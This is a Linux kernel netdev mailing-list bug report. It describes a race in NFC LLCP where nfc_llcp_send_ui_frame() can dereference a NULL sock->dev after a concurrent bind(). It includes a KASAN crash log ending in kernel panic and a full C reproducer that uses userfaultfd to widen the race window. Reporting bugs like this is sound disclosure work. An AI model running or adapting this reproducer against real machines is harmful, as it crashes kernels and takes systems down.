Return-Path: <netdev+bounces-307300-lists+netdev=lfdr.de@vger.kernel.org>
Delivered-To: lists+netdev@lfdr.de
Received: from mail.lfdr.de
	by mail.lfdr.de with LMTP
	id iVB2Njl8VWqEpAAAu9opvQ
	(envelope-from <netdev+bounces-307300-lists+netdev=lfdr.de@vger.kernel.org>)
	for <lists+netdev@lfdr.de>; Tue, 14 Jul 2026 02:00:57 +0200
X-Original-To: lists+netdev@lfdr.de
Received: from sin.lore.kernel.org (sin.lore.kernel.org [IPv6:2600:3c15:e001:75::12fc:5321])
	by mail.lfdr.de (Postfix) with ESMTPS id CACA674FCFB
	for <lists+netdev@lfdr.de>; Tue, 14 Jul 2026 02:00:56 +0200 (CEST)
Authentication-Results: mail.lfdr.de;
	dkim=pass header.d=gmail.com header.s=20251104 header.b=U3AbcZm1;
	spf=pass (mail.lfdr.de: domain of "netdev+bounces-307300-lists+netdev=lfdr.de@vger.kernel.org" designates 2600:3c15:e001:75::12fc:5321 as permitted sender) smtp.mailfrom="netdev+bounces-307300-lists+netdev=lfdr.de@vger.kernel.org";
	dmarc=pass (policy=none) header.from=gmail.com;
	arc=pass ("subspace.kernel.org:s=arc-20240116:i=1")
Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
	by sin.lore.kernel.org (Postfix) with ESMTP id CF3063009F05
	for <lists+netdev@lfdr.de>; Tue, 14 Jul 2026 00:00:53 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 7224C12E1DC;
	Tue, 14 Jul 2026 00:00:53 +0000 (UTC)
X-Original-To: netdev@vger.kernel.org
Received: from mail-yw1-f179.google.com (mail-yw1-f179.google.com [209.85.128.179])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 594C920E702
	for <netdev@vger.kernel.org>; Tue, 14 Jul 2026 00:00:51 +0000 (UTC)
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1783987253; cv=none; b=EYzaDesT7xRQNTVZ42v2KLBw1E2FapWi9dkATblYztyEXHZm35SaW96L18BJyff80kn6NVnDDBu9KgCt4OiSuq+UPDIWp4FmY+gIcr0KiPmC3sk7SChClCkN0mQXv8y6kIDJ2eAJ7IsVkT2k+xxxnxiXcTzJj4B5bZvlKeT2CN8=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1783987253; c=relaxed/simple;
	bh=LWT3Yxh1dZr/jUMhHMC/oOf7pkATWTCn7ZX1DmS0Kzs=;
	h=Message-ID:Date:MIME-Version:To:Cc:From:Subject:Content-Type; b=qoOYlz8u+O7FzADlN0KU71uVbVp3zbKPQ8WsTnzyB5Zmj2uk4bpre64GeCKoNHLuz8SR6s4vUbWRm65AGcyfnaYzrPO27nR0v2vDQyC0aZqCPO/v9epFOVoeqx7uSG//q7DwWIZVtpilRJHvn2qaiwroCw0JhKn09qgJJ2VV4eI=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=U3AbcZm1; arc=none smtp.client-ip=209.85.128.179
Received: by mail-yw1-f179.google.com with SMTP id 00721157ae682-80bb41f7f3cso4432287b3.2
        for <netdev@vger.kernel.org>; Mon, 13 Jul 2026 17:00:51 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1783987250; x=1784592050; darn=vger.kernel.org;
        h=content-transfer-encoding:content-type:subject:from:cc:to
         :content-language:user-agent:mime-version:date:message-id:from:to:cc
         :subject:date:message-id:reply-to:content-type;
        bh=LWT3Yxh1dZr/jUMhHMC/oOf7pkATWTCn7ZX1DmS0Kzs=;
        b=U3AbcZm1/bD9I04TDzsGYxMtusQ9qA8prq2zdisk3BoUDI8+wO1oDwXg57BquJYDxo
         CPgJKcQpZwsYhRK8MgGgLRW6yiqARY9OyrifdiMQBan9nSxVz+FoiqVJE0fmRLKJeyoJ
         btlNiET81Dug/5tqJHTOZbiSWMSQzUZqfmW1uviu0tqnME5+bgB1YqibeDGtgFCX7rGt
         apV1crGXkjoFQtc3d35xMlJEaecGPILGmiTyGnI6OMLkldEtffLqoYzEi0NZdzRTcM4Y
         DcnAclYdZPQK2FdTJkRhu92QjSfzuBsVtVHb4wNyc/m98lPD56HBkwdkHERf3l0mIW6P
         /5ng==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1783987250; x=1784592050;
        h=content-transfer-encoding:content-type:subject:from:cc:to
         :content-language:user-agent:mime-version:date:message-id:x-gm-gg
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
         :content-type;
        bh=LWT3Yxh1dZr/jUMhHMC/oOf7pkATWTCn7ZX1DmS0Kzs=;
        b=HA1m+4z78ar8GddA3A/EYhKECet/ZfC8Bv9BqMj4a5Ee9NhUi/Wkvn6to8rHl98gLO
         26bRvVc4VaK2AhtfufMcW5ToHHgueGRe0aXMO4pDTBufyoLTRMj1hS0FXwTbNxI9jPL7
         KzJD3L/FES6v4GDA3NrBeUTcZpBygOZtNocJgadnVeC+LKg5qGLHn4DpYsCpS9UEqlWo
         wcWaVySTpkxUqm0KrKhOBlQD/FGqDBTrkSHSOVwDdPifFqbATzWfR8Gz3sxdqjYTnr7k
         mMe3DDxbJd0mNfZwaQfm1859AnXjmpLGPy/pY+rEc7+XANA9j6oaIvt+uJRV3hOEWqov
         m+BA==
X-Forwarded-Encrypted: i=1; AHgh+Rpab0mVufO/ducKOAUw51k8v+X79RKIhZ9SuhfL6JeyPriAUh9L9d4sniZLqb0O23xqpmM86+g=@vger.kernel.org
X-Gm-Message-State: AOJu0YyfRfa1i690GVYHowDs3KPZ+ZnXsfGSO67NTA2hLJepW50p8q2N
	irplTva1rTY2BOCk2iQtw7pIXqIYQU2vcP1rV/jk3y4DYYGVV5Ug800C
X-Gm-Gg: AfdE7cm/NtgoXeWFxcuGgOe6fCgH/le10+2PDSgfizTKjaPCHigY9wskOgDFTWdF/Ns
	88ZASbswPqlqVR4DlS1tO0RVm+twqR6sRVVwQE8JWH2am770gUf8+AyIVugYepitzOp42eUojg1
	deK77PvJopzgOj/gSz5+W0+ga/4j7l1/KXxtZh9wAdgPZRwySKuoNcmXeYFpcnKp5Ehv3Hc0wDC
	2DtfaeR2IKQBkzkH+AI7bYCi666J2LlqvgEvupvZlMznmFLBOtGRgbuWYq9+PRXs6iNV+sSSUXG
	Mcb9Le/WcvtWw4eYqmwdcCBmi4uJv1o6Wu5EuQPPVYKteUxMT/RIjmqBVXb/4qLNtJVtxcX0jfS
	eQ0VKpmFR0CVvYgrrIBUMJ4yFV6Pox5ShUeu5rQ3sFEI7LYTKEb+hbNJyBUjfvSL7fhQW9xyWy6
	3T4/i7DKl5ZfODNVxTxea8
X-Received: by 2002:a53:c34a:0:b0:667:c09c:4a34 with SMTP id 956f58d0204a3-667d7b0040fmr5216981d50.11.1783987249986;
        Mon, 13 Jul 2026 17:00:49 -0700 (PDT)
Received: from [141.223.124.60] ([141.223.124.60])
        by smtp.gmail.com with ESMTPSA id 956f58d0204a3-66787ad3833sm14824607d50.20.2026.07.13.17.00.46
        (version=TLS1_3 cipher=TLS_AES_128_GCM_SHA256 bits=128/128);
        Mon, 13 Jul 2026 17:00:49 -0700 (PDT)
Message-ID: <a89d0419-8bcf-40a2-b52d-3e5d911f11da@gmail.com>
Date: Tue, 14 Jul 2026 09:00:45 +0900
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
User-Agent: Mozilla Thunderbird
Content-Language: en-US
To: david@ixit.cz
Cc: krzk@kernel.org, davem@davemloft.net, edumazet@google.com,
 kuba@kernel.org, pabeni@redhat.com, horms@kernel.org,
 oe-linux-nfc@lists.linux.dev, netdev@vger.kernel.org,
 linux-kernel@vger.kernel.org, jdoh.kernel@gmail.com
From: Junwoong Doh <jdoh.kernel@gmail.com>
Subject: [BUG] nfc: llcp: race between nfc_llcp_send_ui_frame() and
 llcp_sock_bind() dereferences NULL sock->dev
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: 8bit
X-Rspamd-Action: no action
X-Spamd-Result: default: False [0.34 / 15.00];
	SUSPICIOUS_RECIPS(1.50)[];
	URI_HIDDEN_PATH(1.00)[https://gist.githubusercontent.com/dandb3/199109d95bd174cb8bd446ed01055861/raw/6889acdc95db08c35d7c5d3288e352da8edaa775/.config];
	ARC_ALLOW(-1.00)[subspace.kernel.org:s=arc-20240116:i=1];
	DMARC_POLICY_ALLOW(-0.50)[gmail.com,none];
	R_SPF_ALLOW(-0.20)[+ip6:2600:3c15:e001:75::/64:c];
	R_DKIM_ALLOW(-0.20)[gmail.com:s=20251104];
	MAILLIST(-0.15)[generic];
	MIME_GOOD(-0.10)[text/plain];
	HAS_LIST_UNSUB(-0.01)[];
	FREEMAIL_CC(0.00)[kernel.org,davemloft.net,google.com,redhat.com,lists.linux.dev,vger.kernel.org,gmail.com];
	TAGGED_FROM(0.00)[bounces-307300-lists,netdev=lfdr.de];
	FROM_HAS_DN(0.00)[];
	FORGED_RECIPIENTS(0.00)[m:david@ixit.cz,m:krzk@kernel.org,m:davem@davemloft.net,m:edumazet@google.com,m:kuba@kernel.org,m:pabeni@redhat.com,m:horms@kernel.org,m:oe-linux-nfc@lists.linux.dev,m:netdev@vger.kernel.org,m:linux-kernel@vger.kernel.org,m:jdoh.kernel@gmail.com,m:jdohkernel@gmail.com,s:lists@lfdr.de];
	MIME_TRACE(0.00)[0:+];
	RCVD_TLS_LAST(0.00)[];
	FORWARDED(0.00)[lists@lfdr.de];
	FORGED_SENDER(0.00)[jdohkernel@gmail.com,netdev@vger.kernel.org];
	FORGED_SENDER_MAILLIST(0.00)[];
	DKIM_TRACE(0.00)[gmail.com:+];
	ASN(0.00)[asn:63949, ipnet:2600:3c15::/32, country:SG];
	FORGED_RECIPIENTS_FORWARDING(0.00)[];
	RCVD_COUNT_FIVE(0.00)[5];
	TO_DN_NONE(0.00)[];
	FORGED_SENDER_FORWARDING(0.00)[];
	FROM_NEQ_ENVFROM(0.00)[jdohkernel@gmail.com,netdev@vger.kernel.org];
	PRECEDENCE_BULK(0.00)[];
	FORGED_RECIPIENTS_MAILLIST(0.00)[];
	ALIAS_RESOLVED(0.00)[];
	MID_RHS_MATCH_FROM(0.00)[];
	FREEMAIL_FROM(0.00)[gmail.com];
	RCPT_COUNT_SEVEN(0.00)[11];
	RCVD_VIA_SMTP_AUTH(0.00)[];
	TAGGED_RCPT(0.00)[netdev];
	DBL_BLOCKED_OPENRESOLVER(0.00)[sin.lore.kernel.org:helo,sin.lore.kernel.org:rdns,vger.kernel.org:from_smtp,gist.githubusercontent.com:url]
X-Rspamd-Server: lfdr
X-Rspamd-Queue-Id: CACA674FCFB

Hello,

Commit dded08927ca3 ("nfc: llcp: fix NULL error pointer dereference on
sendmsg() after failed bind()") added a NULL check for llcp_sock->local
in llcp_sock_sendmsg(), but it does not handle all the races.
The thread interleaving is the same as Krzysztof mentioned:
https://lore.kernel.org/oe-linux-nfc/20220119074816.6505-2-krzysztof.kozlowski@canonical.com/

In detail:
nfc_llcp_send_ui_frame() checks sock->local == NULL, but it is called
without socket's lock held, which opens a window for a race condition.
Between the sock->local == NULL check and the sock->dev use in
nfc_alloc_send_skb(), llcp_sock_bind() can run concurrently and set
both sock->local and sock->dev to NULL.
This leads to NULL pointer dereference in the nfc_alloc_send_skb() call.
Moreover, the window can be enlarged by the
memcpy_from_msg(msg_data, msg, len) call that sits between
the sock->local check and the sock->dev use.

I used /dev/virtual_nci to set up a virtual NFC device,
so the reproducer must be executed as root:
  gcc repro.c -o repro -static -lpthread
  ./repro

Reproduced crash log:
==================================================================
[   46.787552][ T9432] Oops: general protection fault, probably for non-canonical address 0xdffffc00000000b4: 0000 [#1] SMP KASAN NOPTI
[   46.787982][ T9432] KASAN: null-ptr-deref in range [0x00000000000005a0-0x00000000000005a7]
[   46.788264][ T9432] CPU: 0 UID: 0 PID: 9432 Comm: minimize Not tainted 7.2.0-rc3 #3 PREEMPT(full) 
[   46.788565][ T9432] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-1 04/01/2014
[   46.788869][ T9432] RIP: 0010:nfc_alloc_send_skb+0x3e/0x1a0
[   46.789080][ T9432] Code: 54 41 89 d4 55 53 48 89 fb 48 8d ab a0 05 00 00 48 83 ec 08 e8 b3 d3 79 f6 48 89 ea 48 b8 00 00 00 00 00 fc ff df 48 c1 ea 03 <0f> b6 04 02 84 c0 74 08 3c 03 0f 8e 1d 01 00 00 48 8d bb a4 05 00
[   46.789707][ T9432] RSP: 0018:ffffc90003c1f9a8 EFLAGS: 00010216
[   46.789909][ T9432] RAX: dffffc0000000000 RBX: 0000000000000000 RCX: 0000000000000082
[   46.790164][ T9432] RDX: 00000000000000b4 RSI: ffffffff8b46300d RDI: 0000000000000000
[   46.790418][ T9432] RBP: 00000000000005a0 R08: ffffc90003c1fa70 R09: ffffed100f11e9ff
[   46.790672][ T9432] R10: 0000000000000880 R11: 0000000000000000 R12: 0000000000000000
[   46.790928][ T9432] R13: 0000000000000082 R14: ffff88802c144000 R15: ffffc90003c1fa70
[   46.791184][ T9432] FS:  00007f788883d640(0000) GS:ffff888124680000(0000) knlGS:0000000000000000
[   46.791470][ T9432] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   46.791684][ T9432] CR2: 00000000004b0270 CR3: 00000000287d4000 CR4: 00000000000006f0
[   46.791942][ T9432] Call Trace:
[   46.792052][ T9432]  <TASK>
[   46.792150][ T9432]  nfc_llcp_send_ui_frame+0x412/0x690
[   46.792331][ T9432]  ? __pfx_nfc_llcp_send_ui_frame+0x10/0x10
[   46.792526][ T9432]  ? llcp_sock_sendmsg+0x300/0x480
[   46.792696][ T9432]  ? __local_bh_enable_ip+0xa4/0x120
[   46.792877][ T9432]  llcp_sock_sendmsg+0x364/0x480
[   46.793042][ T9432]  ? bpf_lsm_socket_sendmsg+0x9/0x10
[   46.793217][ T9432]  ? __pfx_llcp_sock_sendmsg+0x10/0x10
[   46.793398][ T9432]  ____sys_sendmsg+0xa27/0xb90
[   46.793560][ T9432]  ? __pfx_____sys_sendmsg+0x10/0x10
[   46.793734][ T9432]  ? __pfx_copy_msghdr_from_user+0x10/0x10
[   46.793929][ T9432]  ? find_held_lock+0x2b/0x80
[   46.794085][ T9432]  ? clockevents_program_event+0x27c/0x990
[   46.794278][ T9432]  ___sys_sendmsg+0x11c/0x1b0
[   46.794436][ T9432]  ? __pfx____sys_sendmsg+0x10/0x10
[   46.794611][ T9432]  ? __fget_files+0x1fb/0x3b0
[   46.794770][ T9432]  __sys_sendmsg+0x142/0x1f0
[   46.794926][ T9432]  ? __pfx___sys_sendmsg+0x10/0x10
[   46.795097][ T9432]  ? __cpu_to_node+0x8a/0x130
[   46.795256][ T9432]  do_syscall_64+0x11f/0x830
[   46.795414][ T9432]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[   46.795608][ T9432] RIP: 0033:0x453cfd
[   46.795738][ T9432] Code: 28 89 54 24 1c 48 89 74 24 10 89 7c 24 08 e8 6a 86 02 00 8b 54 24 1c 48 8b 74 24 10 41 89 c0 8b 7c 24 08 b8 2e 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 33 44 89 c7 48 89 44 24 08 e8 ae 86 02 00 48
[   46.796354][ T9432] RSP: 002b:00007f788883d0d0 EFLAGS: 00000293 ORIG_RAX: 000000000000002e
[   46.796623][ T9432] RAX: ffffffffffffffda RBX: 00007f788883d640 RCX: 0000000000453cfd
[   46.796879][ T9432] RDX: 0000000000000000 RSI: 00007f788883d120 RDI: 0000000000000006
[   46.797133][ T9432] RBP: 00007f788883d1d0 R08: 0000000000000000 R09: 00007ffe3551378f
[   46.797387][ T9432] R10: 0000000000000008 R11: 0000000000000293 R12: 00007f788883d640
[   46.797641][ T9432] R13: 0000000000000000 R14: 0000000000415330 R15: 00007f788803d000
[   46.797912][ T9432]  </TASK>
[   46.798017][ T9432] Modules linked in:
[   46.798231][ T9432] ---[ end trace 0000000000000000 ]---
[   46.813550][ T9432] RIP: 0010:nfc_alloc_send_skb+0x3e/0x1a0
[   46.813783][ T9432] Code: 54 41 89 d4 55 53 48 89 fb 48 8d ab a0 05 00 00 48 83 ec 08 e8 b3 d3 79 f6 48 89 ea 48 b8 00 00 00 00 00 fc ff df 48 c1 ea 03 <0f> b6 04 02 84 c0 74 08 3c 03 0f 8e 1d 01 00 00 48 8d bb a4 05 00
[   46.814427][ T9432] RSP: 0018:ffffc90003c1f9a8 EFLAGS: 00010216
[   46.814632][ T9432] RAX: dffffc0000000000 RBX: 0000000000000000 RCX: 0000000000000082
[   46.814900][ T9432] RDX: 00000000000000b4 RSI: ffffffff8b46300d RDI: 0000000000000000
[   46.815161][ T9432] RBP: 00000000000005a0 R08: ffffc90003c1fa70 R09: ffffed100f11e9ff
[   46.815423][ T9432] R10: 0000000000000880 R11: 0000000000000000 R12: 0000000000000000
[   46.815684][ T9432] R13: 0000000000000082 R14: ffff88802c144000 R15: ffffc90003c1fa70
[   46.815948][ T9432] FS:  00007f788883d640(0000) GS:ffff888124680000(0000) knlGS:0000000000000000
[   46.816243][ T9432] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   46.816462][ T9432] CR2: 00007f871e9f90a0 CR3: 00000000287d4000 CR4: 00000000000006f0
[   46.816725][ T9432] Kernel panic - not syncing: Fatal exception
[   46.817025][ T9432] Kernel Offset: disabled
[   46.817173][ T9432] Rebooting in 86400 seconds..
==================================================================

C reproducer:
==================================================================
#define _GNU_SOURCE
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <linux/nfc.h>
#include <linux/userfaultfd.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>

#define IOCTL_GET_NCIDEV_IDX 0

static void fatal(const char *m) {
    perror(m);
    exit(1);
}

static int new_llcp_sock(void) {
    int s = socket(AF_NFC, SOCK_DGRAM, NFC_SOCKPROTO_LLCP);
    if (s < 0) {
        fatal("socket");
    }
    return s;
}

static int do_bind(int s, uint32_t devidx, const char *name) {
    struct sockaddr_nfc_llcp a = {
        .sa_family = AF_NFC,
        .dev_idx   = devidx,
        .dsap      = 0,
        .ssap      = 1
    };
    strncpy(a.service_name, name, sizeof(a.service_name));
    a.service_name_len = strlen(name);
    return bind(s, (struct sockaddr *)&a, sizeof(a));
}

static int open_dev(uint32_t *idx) {
    int fd = open("/dev/virtual_nci", O_RDWR);
    if (fd < 0) {
        fatal("open /dev/virtual_nci");
    }
    if (ioctl(fd, IOCTL_GET_NCIDEV_IDX, idx) < 0) {
        fatal("GET_NCIDEV_IDX");
    }
    return fd;
}

static int victim;
static void *payload;

static void *sender(void *arg) {
    struct iovec iov = {
        .iov_base = payload,
        .iov_len = 0x1000
    };
    struct sockaddr_nfc_llcp vdest = {
        .sa_family = AF_NFC,
        .dsap = 1,
        .ssap = 6
    };
    struct msghdr msg = {
        .msg_name    = &vdest,
        .msg_namelen = sizeof(vdest),
        .msg_iov     = &iov,
        .msg_iovlen  = 1
    };
    sendmsg(victim, &msg, 0);
    return NULL;
}

int init_userfaultfd() {
    int uffd = syscall(SYS_userfaultfd, O_CLOEXEC | O_NONBLOCK);
    if (uffd < 0) {
        fatal("userfaultfd");
    }
    struct uffdio_api api = {
        .api = UFFD_API
    };
    if (ioctl(uffd, UFFDIO_API, &api) < 0) {
        fatal("UFFDIO_API");
    }
    
    payload = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (payload == MAP_FAILED) {
        fatal("mmap");
    }
    struct uffdio_register reg = {
        .range = {
            .start = (unsigned long)payload,
            .len = 0x1000
        },
        .mode  = UFFDIO_REGISTER_MODE_MISSING,
    };  
    if (ioctl(uffd, UFFDIO_REGISTER, &reg) < 0) {
        fatal("UFFDIO_REGISTER");
    }

    return uffd;
}

int main(void) {
    uint32_t idx_live, idx_kill;

    int fd_live = open_dev(&idx_live);
    int helper  = new_llcp_sock();
    if (do_bind(helper, idx_live, "collide") < 0) {
        fatal("helper bind");
    }
    
    int fd_kill = open_dev(&idx_kill);
    victim = new_llcp_sock();
    if (do_bind(victim, idx_kill, "victim") < 0) {
        fatal("victim bind");
    }
    
    int uffd = init_userfaultfd();
    
    pthread_t th;
    if (pthread_create(&th, NULL, sender, payload)) {
        fatal("pthread_create");
    }
    
    // Execute after page fault raised
    struct pollfd pfd = {
        .fd = uffd,
        .events = POLLIN
    };
    if (poll(&pfd, 1, -1) < 0) {
        fatal("poll");
    }
    struct uffd_msg um;
    if (read(uffd, &um, sizeof(um)) != sizeof(um)) {
        fatal("read uffd");
    }
    
    close(fd_kill);
    do_bind(victim, idx_live, "collide");

    struct uffdio_zeropage zp = {
        .range = {
            .start = payload,
            .len = 0x1000,
        },
    };
    ioctl(uffd, UFFDIO_ZEROPAGE, &zp); // Resume sendmsg()

    return 0;
}
==================================================================

Kernel commit: a13c140cc289c0b7b3770bce5b3ad42ab35074aa (v7.2-rc3)
Config: https://gist.githubusercontent.com/dandb3/199109d95bd174cb8bd446ed01055861/raw/6889acdc95db08c35d7c5d3288e352da8edaa775/.config

Thanks,
Junwoong


